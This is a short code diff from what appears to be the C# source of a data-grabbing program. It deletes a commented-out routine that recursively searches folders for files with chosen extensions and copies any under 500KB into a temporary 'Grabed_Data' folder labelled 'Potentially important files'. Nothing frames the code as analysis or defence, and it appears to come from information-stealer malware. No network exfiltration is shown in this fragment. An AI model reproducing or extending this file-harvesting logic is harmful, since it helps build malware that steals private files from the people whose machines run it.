@@ -60,28 +60,6 @@
                         continue;
                     }
                 }
-                //foreach (string directory in directoryes)
-                //{
-                //    string[] subFolders = Directory.GetDirectories(directory);
-
-                //    //foreach (string subFolder in subFolders)
-                //    //{
-                //        foreach (string file in Directory.GetFiles(directory, "*", SearchOption.AllDirectories))
-                //        {
-                //            foreach (string ext in extenshions)
-                //            {
-                //                if (file.EndsWith(ext))
-                //                {
-                //                    FileInfo fileInfo = new FileInfo(file);
-                //                    if (fileInfo.Length < 512000) // 500KB
-                //                    {
-                //                        File.Copy(Path.Combine(file), Path.Combine(Path.GetTempPath(), "Grabed_Data", "Potentially important files", Path.GetFileName(file)));
-                //                    }
-                //                }
-                //            }
-                //        }
-                //    //}
-                //}
             }
             catch { }
         }
